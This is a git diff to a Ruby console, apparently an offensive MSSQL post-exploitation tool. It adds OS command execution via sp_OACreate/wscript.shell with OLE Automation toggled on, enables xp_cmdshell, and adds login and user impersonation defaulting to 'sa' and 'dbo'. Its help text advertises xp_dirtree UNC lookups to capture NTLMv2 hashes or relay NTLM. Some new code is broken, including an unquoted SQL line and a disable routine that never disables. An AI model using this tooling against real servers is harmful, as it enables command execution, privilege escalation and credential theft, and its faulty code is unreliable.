@@ -239,9 +239,12 @@ on      perm.grantee_principal_id = princ.principal_id
     cmd_query("SELECT conn.session_id, host_name, status, program_name, nt_domain, login_name, connect_time, last_request_end_time FROM sys.dm_exec_sessions AS sess JOIN sys.dm_exec_connections AS conn ON sess.session_id = conn.session_id;")
   end
 
-  def cmd_stored_procedures(name=nil)
-    #TBD 
-    # query SELECT name FROM sys.procedures WHERE name LIKE '%read_txt_sp_%'
+  def cmd_enum_stored_procedures(name=nil)
+    if name.nil? or name.empty?
+      name = '%'
+      puts "[!] ".yellow + "No procedure name is give (default: all '#{name}' )"
+    end
+    cmd_query SELECT name FROM sys.procedures WHERE name LIKE name
   end
 
   # 
@@ -366,6 +369,18 @@ on      perm.grantee_principal_id = princ.principal_id
     end
     cmd_query("EXEC xp_cmdshell '#{cmd}'")
   end
+  
+  def cmd_exec_oacreate(cmd)
+    if cmd.nil? || cmd.empty?
+      puts "[!] ".yellow + "No command was provided"
+      return 
+    end
+
+    enable_ole_automation
+    make_sure = -> {disable_ole_automation}
+    puts "[+] ".green + "Executing the command through OACreate procedure"
+    cmd_query(exec_procedure(cmd), print: false, callback: make_sure)
+  end
 
   # TBD : https://github.com/NetSPI/Powershell-Modules/blob/master/Get-MSSQLAllCredentials.psm1
   def cmd_get_allcredentials(val=nil)
@@ -378,24 +393,30 @@ on      perm.grantee_principal_id = princ.principal_id
   # 
   # 
   def cmd_enable_xpcmdshell(val=nil)
+    check_query = "SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'xp_cmdshell' OR name = 'show advanced options';"
+    set_query   = "EXEC('sp_configure ''show advanced options'', 1; reconfigure;');EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;')"
+    
     puts "[+] ".green + "Current configurations:"
-    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'xp_cmdshell' OR name = 'show advanced options';")
+    cmd_query(check_query)
     puts "[+] ".green + "Enabling xp_cmdshell"
-    cmd_query("EXEC('sp_configure ''show advanced options'', 1; reconfigure;');EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;')")
+    cmd_query(set_query, print: false)
     puts "[+] ".green + "Modified configurations:"
-    cmd_query('SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = "xp_cmdshell" OR name = "show advanced options";')
+    cmd_query(check_query)
   end
 
   def cmd_disable_xpcmdshell(val=nil)
+    check_query = "SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'xp_cmdshell' OR name = 'show advanced options';"
+    set_query   = "EXEC('sp_configure ''xp_cmdshell'', 0; reconfigure;');EXEC('sp_configure ''show advanced options'', 0; reconfigure;')"
+
     puts "[+] ".green + "Current configurations:"
-    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'xp_cmdshell' OR name = 'show advanced options';")
-    puts "[+] ".green + "Enabling xp_cmdshell"
-    cmd_query("EXEC('sp_configure ''xp_cmdshell'', 0; reconfigure;');EXEC('sp_configure ''show advanced options'', 0; reconfigure;')")
+    cmd_query(check_query)
+    puts "[+] ".green + "Disabling xp_cmdshell"
+    cmd_query(check_query, print: false)
     puts "[+] ".green + "Modified configurations:"
-    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'xp_cmdshell' OR name = 'show advanced options';")
+    cmd_query(check_query)
   end
 
-  def cmd_impersonate_login(user)
+  def cmd_impersonate_login(user='sa')
     puts "[+] ".green + "Current user:"
     u = cmd_query("SELECT SYSTEM_USER AS 'username'", print: false).first[:username]
     puts u
@@ -403,6 +424,17 @@ on      perm.grantee_principal_id = princ.principal_id
     cmd_query("EXECUTE AS LOGIN = '#{user}';", print: false)
     puts "[+] ".green + "Current user (impersonated):"
     u = cmd_query("SELECT SYSTEM_USER AS 'username'", print: false).first[:username]
+    puts u
+  end
+
+  def cmd_impersonate_user(user='dbo', db='msdb')
+    puts "[+] ".green + "Current user:"
+    u = cmd_query("SELECT USER_NAME() AS 'username'", print: false).first[:username]
+    puts u
+    puts "[+] ".green + "Trying to impersonate '#{user}' user on '#{db}'"
+    cmd_query("use #{db}; EXECUTE AS USER = '#{user}';", print: false)
+    puts "[+] ".green + "Current user (impersonated):"
+    u = cmd_query("SELECT USER_NAME() AS 'username'", print: false).first[:username]
     puts u
   end
 
@@ -441,14 +473,15 @@ on      perm.grantee_principal_id = princ.principal_id
     main = {
       "query" => "query <QUERY> - send raw query to the database.",
       "query-link" => "query-link <LINK> <QUERY> - send raw query to the database.",
-      "verbose" => "verbose [true | false] - show queries behind built-in commands.",
-      "debug" => "debug [true | false] - show queries values behind executed queries.",
+      "verbose" => "verbose [true | false] - show how the queries/commands look behind the sceen (default: false).",
+      "debug" => "debug [true | false] - show how the queries values look behind behind the sceen (default: false).",
       "help" => "Show this screen",
       "exit" => "exit the console"
     }
 
     system = {
       "exec" => "exec <CMD> - Execute Windows commands using xp_cmdshell.",
+      "exec-oacreate" => "cmd_exec_oacreate <CMD> Execute Windows commands using OACreate procedure.",
       "cat" => "cat <FILE> - Read file from disk. (full path must given)",
       "mkdir" => "mkdir <DIR> - Create directories and subdirectories (acts like mkdir -p). (full path must given)",
       "dirtree" => "dirtree <UNC> - Execute xp_dirtree to list local or remote(UNC) system's files & directories. UNC path can be used to capture NTLMv2 hash or NTLM-relay.",
@@ -456,8 +489,8 @@ on      perm.grantee_principal_id = princ.principal_id
     }
     
     db = {
-      "impersonate-login" => "",
-      "impersonate-user" => "",
+      "impersonate-login" => "impersonate-login <USER> - impersonate login user",
+      "impersonate-user" => "impersonate-login <USER> <DB> - impersonate database user (default: user='dbo', db='msdb')",
       "enable-xpcmdshell" => "enable-xpcmdshell - enable xp_cmdshell on MSSQL.",
       "disable-xpcmdshell" => "disable-xpcmdshell - disable xp_cmdshell on MSSQL."
     }
@@ -471,6 +504,7 @@ on      perm.grantee_principal_id = princ.principal_id
       "enum-users" => "enum-users [NUM=10] - retrieve database users by id (default: first 0-10).",
       "enum-domain-groups" => "enum-domain-groups [DOMAIN]- retrieve domain groups.",
       "enum-impersonation" => "enum-impersonation - enumerate impersonationable users.",
+      "enum_stored_procedures" => "enum_stored_procedures [SQL Regex] - retrieve stored procedures.",
       "dbs" => "dbs - list databases.",
       "tables" => "tables <DB_Name> - list tables for database.",
       "columns" => "columns <Table_Name> - list columns from table.",
@@ -515,22 +549,43 @@ on      perm.grantee_principal_id = princ.principal_id
   # 
   def enable_ole_automation
     _print = @verbose =~ /true/i? true : false
+    check_query = "SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'Ole Automation Procedures'"
+    set_query   = "EXEC('sp_configure ''show advanced options'', 1; reconfigure;');EXEC('sp_configure ''Ole Automation Procedures'', 1; reconfigure;')"
+
     puts "[+] ".green + "Current configurations:" if _print
-    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'Ole Automation Procedures'", {print: _print})
+    cmd_query(check_query, {print: _print})
     puts "[+] ".green + "Enabling Ole Automation Procedures"
-    cmd_query("EXEC('sp_configure ''show advanced options'', 1; reconfigure;');EXEC('sp_configure ''Ole Automation Procedures'', 1; reconfigure;')", {print: _print})
+    cmd_query(set_query, {print: _print})
     puts "[+] ".green + "Modified configurations:" if _print
-    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'Ole Automation Procedures'", {print: _print})
+    cmd_query(check_query, {print: _print})
   end
 
   def disable_ole_automation
     _print = @verbose =~ /true/i? true : false
+    check_query = "SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'Ole Automation Procedures'"
+    set_query   = "EXEC('sp_configure ''Ole Automation Procedures'', 0; reconfigure;');EXEC('sp_configure ''show advanced options'', 0; reconfigure;')"
+
     puts "[+] ".green + "Current configurations:" if _print
-    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'Ole Automation Procedures'", {print: _print})
+    cmd_query(check_query, {print: _print})
     puts "[+] ".green + "Disabling Ole Automation Procedures"
-    cmd_query("EXEC('sp_configure ''Ole Automation Procedures'', 0; reconfigure;');EXEC('sp_configure ''show advanced options'', 0; reconfigure;')", {print: _print})
+    cmd_query(set_query, {print: _print})
     puts "[+] ".green + "Modified configurations:" if _print
-    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'Ole Automation Procedures'", {print: _print})
+    cmd_query(check_query, {print: _print})
+  end
+
+  # cmd /c "ifconfig >> C:\Windows\Tasks\output.txt"
+  def exec_procedure(cmd)
+    _print = @verbose =~ /true/i? true : false
+    if _print
+      puts "[+] ".green + "Executing command:"
+      puts "#{cmd}"
+    end
+    
+    query = <<~RAWSQL
+    DECLARE @toexec INT; 
+        EXEC sp_oacreate 'wscript.shell', @toexec OUTPUT; 
+        EXEC sp_oamethod @toexec, 'run', null, '#{cmd}';
+    RAWSQL
   end
 
   def create_readfile_procedure
